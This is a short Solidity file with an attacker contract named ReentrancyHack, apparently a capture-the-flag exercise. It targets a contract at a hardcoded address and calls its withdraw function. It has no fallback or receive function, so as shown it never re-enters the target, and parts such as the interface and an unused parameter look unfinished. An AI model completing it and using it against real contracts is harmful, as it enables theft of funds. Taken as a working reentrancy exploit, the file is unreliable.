// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;

interface IReentranncy{
    function withdraw(uint ammount) external returns(uint);
    function balanceOf(address _who) external;
}

contract ReentrancyHack {
    IReentranncy reentrancy = IReentranncy(0x34889C648705e531acfB0561D77bB5b29C06AAb5);

    function give() public payable returns(uint) {
        require(msg.value > 0);
        return address(this).balance;
    }
    function hack(uint val) public {
        reentrancy.withdraw(100);
    }
}

